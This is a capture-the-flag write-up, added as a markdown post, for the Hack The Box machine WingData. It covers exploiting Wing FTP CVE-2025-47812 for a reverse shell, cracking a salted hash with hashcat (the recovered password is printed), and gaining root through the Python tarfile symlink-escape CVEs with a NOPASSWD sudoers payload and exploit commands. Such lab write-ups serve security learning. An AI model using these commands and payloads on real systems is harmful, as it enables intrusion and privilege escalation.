@@ -1,0 +1,443 @@
+---
+title: HTB - WingData (easy)
+date: '2026-02-18'
+tags: ['machine', 'linux', 'wing-ftp', 'tarfile', 'path-traversal', 'symlink-escape', 'sudoers']
+draft: false
+summary: The target runs an outdated version of Wing FTP Server which is vulnerable to CVE-2025-47812 that allows for initial foothold. Gathering credentials by cracking a salted hash in the credential file that leads to the user flag. Then, acquired root by exploiting a sudo misconfiguration that allowed running a vulnerable Python version with a custom program that uses the tarfile module of which allows for path traversal, symlink escape & write access to system files (CVE-2025-4517 & CVE-2025-4138) 
+---
+
+
+![Description](/static/images/htb/linux/wingdata/wingdata.png)
+
+
+<TOCInline toc={props.toc} asDisclosure />
+
+
+## Scanning
+
+```bash
+❯ nmap -sV -sC --min-rate=1000 10.129.94.210
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-17 19:49 UTC
+Nmap scan report for ftp.wingdata.htb (10.129.94.210)
+Host is up (0.16s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-title: Site doesn't have a title (text/html).
+| http-server-header: 
+|   Apache/2.4.66 (Debian)
+|_  Wing FTP Server(Free Edition)
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.88 seconds
+```
+
+We can see that only web is up, let's check that out
+
+
+
+
+## Enumeration
+
+![Description](/static/images/htb/linux/wingdata/1.png)
+
+
+We discover that the `Client Portal` button is redirecting to a virtual host called `ftp.wingdata.htb`
+
+![Description](/static/images/htb/linux/wingdata/2.png)
+
+
+Let's add that entry to our hosts file
+
+
+```bash
+10.129.94.210   ftp.wingdata.htb    wingdata.htb
+```
+
+
+We can see it is an instance of Wing FTP Server version 7.4.3
+
+
+![Description](/static/images/htb/linux/wingdata/3.png)
+
+
+
+
+
+## Searching for Public Exploits
+
+
+Some basic searches will show an existing vulnerability within Wing FTP Server versions 7.4.3 and earlier. CVE-2025-475812
+is a pre-auth vulnerability that results in RCE. 
+
+
+https://github.com/0xcan1337/CVE-2025-47812-poC
+
+![Description](/static/images/htb/linux/wingdata/4.png)
+
+
+The root cause is due to improper handling of NULL bytes in the username parameter during login.
+This allows unauthenticated attackers to inject Lua code into session files, leading to RCE
+
+
+[This](https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/) article has a very good explanation on the bug and how it was exploited. I urge you to also read it :)
+
+
+
+
+
+## Gaining Access
+
+
+Using the exploit, we will want to opt for a reverse shell. Let's start a listener using `penelope` and just run the interactive script
+
+![Description](/static/images/htb/linux/wingdata/5.png)
+
+
+![Description](/static/images/htb/linux/wingdata/6.png)
+
+
+Our listener should have caught the shell
+
+
+![Description](/static/images/htb/linux/wingdata/7.png)
+
+
+
+
+
+### Extracting User Credentials
+
+
+Normally after pwning a webserver, we would start to look for users and passwords in the web credential files. Gemini reveals the files location 
+for us. Thank you, Gemini
+
+
+![Description](/static/images/htb/linux/wingdata/8.png)
+
+In Windows it would be `/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml`
+
+Let's look for other users, we can find their location in `/opt/wftpserver/Data/1/users`
+
+
+![Description](/static/images/htb/linux/wingdata/9.png)
+
+
+We discover `wacky` is a valid user in the current environment
+
+```bash
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls /home
+wacky
+```
+
+
+
+### Cracking Salted Hash
+
+
+![Description](/static/images/htb/linux/wingdata/10.png)
+
+
+Observe that the password section of the credential file looks like a form of hash. According to the official [docs](https://www.wftpserver.com/help/ftpserver/index.html?administration.htm)
+, the password string is encrypted with SHA256 with a salt which value is `WingFTP`
+
+
+![Description](/static/images/htb/linux/wingdata/11.png)
+
+
+Using `hashcat`, we need to use the appropriate mode which is `1410`. According to this [discussion](https://security.stackexchange.com/questions/204977/hashcat-cracking-a-salted-sha256),
+the command would be the following:
+
+```bash
+hashcat -m 1410 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt
+```
+
+![Description](/static/images/htb/linux/wingdata/12.png)
+
+
+```
+wacky:!#7Blushing^*Bride5
+```
+
+
+And just like that we can SSH into `wacky` and retrieve the user flag
+
+
+![Description](/static/images/htb/linux/wingdata/13.png)
+
+
+
+
+
+## Privilege Escalation
+
+
+### Disclaimer
+
+To be honest, the privesc chain was somewhat not that visible for me without a nudge. I received a little nudge of which I will show later.
+
+
+
+### Sudo privileges
+
+
+Checking `sudo` privileges we discover that user `wacky` is allowed to run a custom Python script with `sudo`
+
+
+```bash
+sudo -l
+```
+
+![Description](/static/images/htb/linux/wingdata/14.png)
+
+
+Inspecting the script:
+
+```Python
+#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = "/opt/backup_clients/backups"
+STAGING_BASE = "/opt/backup_clients/restored_backups"
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
+        return False
+    client_id = filename.split('_')[1].rstrip('.tar')
+    return client_id.isdigit() and client_id != "0"
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Restore client configuration from a validated backup tarball.",
+        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
+    )
+    parser.add_argument(
+        "-b", "--backup",
+        required=True,
+        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
+             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
+    )
+    parser.add_argument(
+        "-r", "--restore-dir",
+        required=True,
+        help="Staging directory name for the restore operation. "
+             "Must follow the format: restore_<client_user> (e.g., restore_john). "
+             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
+    )
+
+    args = parser.parse_args()
+
+    if not validate_backup_name(args.backup):
+        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
+        sys.exit(1)
+
+    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
+    if not os.path.isfile(backup_path):
+        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
+        sys.exit(1)
+
+    if not args.restore_dir.startswith("restore_"):
+        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    tag = args.restore_dir[8:]
+    if not tag:
+        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    if not validate_restore_tag(tag):
+        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
+        sys.exit(1)
+
+    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
+    print(f"[+] Backup: {args.backup}")
+    print(f"[+] Staging directory: {staging_dir}")
+
+    os.makedirs(staging_dir, exist_ok=True)
+
+    try:
+        with tarfile.open(backup_path, "r") as tar:
+            tar.extractall(path=staging_dir, filter="data")
+        print(f"[+] Extraction completed in {staging_dir}")
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f"[!] Error during extraction: {e}", file=sys.stderr)
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
+```
+
+
+
+We can observe it is a program that takes in a tarball backup file and extracts it which is pretty simple. If we attempt common methods like 
+backing up the `root` directory or backing up symlinks which point to the `root` directory, they will fail without the extraction.
+
+
+
+
+
+### Looking for Public Exploits
+
+
+Now this was the nudge I received:
+
+
+> Did you check CVE's for this python version?
+
+
+At first, I was really thrown off by that question. How often do people often check Python versions? Hahaha, guess I need to improve my methodology...
+
+
+```bash
+python3 -V
+```
+
+![Description](/static/images/htb/linux/wingdata/15.png)
+
+
+Now a little bit of googling will show us a few CVEs that look quite similar
+
+https://www.cybersecurity-help.cz/vdb/SB2025062630
+
+
+![Description](/static/images/htb/linux/wingdata/16.png)
+
+
+Looking further, we find this POC repository which confirms it is both of these two, CVE-2025-4138 and CVE-2025-4517 dubbed Python tarfile Filter Bypass
+via `PATH_MAX` Symlink Escape
+
+
+https://github.com/DesertDemons/CVE-2025-4138-4517-POC
+
+![Description](/static/images/htb/linux/wingdata/17.png)
+
+
+
+### Vulnerability Analysis
+
+
+The vulnerability is the `tarfile` module that allows an attacker to bypass extraction filters (`"data"` and `"tar"`) and write arbitrary files outside the intended extraction directory.
+When a privileged process (e.g., a root-level backup script, CI/CD pipeline, or package installer) extracts an attacker-controlled tar archive using the supposedly-safe filter="data" parameter, this exploit achieves full arbitrary file write as that privileged user
+. In other words, escalating to root
+
+
+The root cause is a behavioral quirk in `os.path.realpath()`: it silently stops resolving symlinks once the fully-expanded path exceeds `PATH_MAX`
+(4096 bytes on Linux)
+
+
+![Description](/static/images/htb/linux/wingdata/18.png)
+
+
+We can also see in the custom script that it uses the `data` filter which matches the description of the vulnerability
+
+```python
+    try:
+        with tarfile.open(backup_path, "r") as tar:
+            tar.extractall(path=staging_dir, filter="data")
+        print(f"[+] Extraction completed in {staging_dir}")
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f"[!] Error during extraction: {e}", file=sys.stderr)
+        sys.exit(2)
+```
+
+
+
+Basically we have `root` level access to write to files. The full technical details are on the repository itself with the POC having alternative methods of exploiting it. Though I will walk through the attack
+chain here by writing to the `sudoers` file
+
+
+
+
+
+
+### Attack Chain
+
+
+We create a `.txt` file with the payload:
+
+```bash
+wacky ALL=(ALL:ALL) NOPASSWD: ALL
+```
+
+Then run the exploit to create the tarball containing the payload. What this script does is:
+
+1. Build 16 levels of  dir(247 chars) + symlink(1 char → dir) Resolved path grows to ~3968 bytes, nearly filling `PATH_MAX`.
+2. Add a final symlink whose linkname uses the short-name chain + "../../.."(16 levels of "..") to traverse out.  `os.path.realpath()` cannot expand it → passes filter.
+3. Through that escaped symlink, write arbitrary files on the filesystem
+
+
+
+
+```bash
+python3 exploit.py --preset sudoers --payload pwn.txt --tar-out backup_6666.tar
+```
+
+![Description](/static/images/htb/linux/wingdata/19.png)
+
+
+
+Move the tarball to the `backups` directory and run the custom program with `sudo` privileges
+
+```bash
+mv backup_6666.tar /opt/backup_clients/backups/
+```
+
+```bash
+sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_6666.tar -r restore_pwned
+```
+
+
+![Description](/static/images/htb/linux/wingdata/20.png)
+
+
+Check `sudo` privileges again and observe that file write was successfull and we can easily switch to `root` without authentication. Procced to retrieve the root flag
+
+
+![Description](/static/images/htb/linux/wingdata/21.png)
+
+
+```bash
+sudo su -
+```
+
+![Description](/static/images/htb/linux/wingdata/22.png)
+
+
+
+
+
+---
+
+## Sources
+
+- https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/
+- https://www.wftpserver.com/help/ftpserver/index.html?administration.htm
+- https://www.cybersecurity-help.cz/vdb/SB2025062630
+- https://www.rapid7.com/db/vulnerabilities/oracle_linux-cve-2025-4517/
+- https://www.penligent.ai/hackinglabs/cve-2025-4517-poc-without-weaponizing-it-defensive-validation-patch-lines-and-the-tarfile-trap-inside-automation/
+
+
+
+
+
+
+
+
+
+
+
+
+
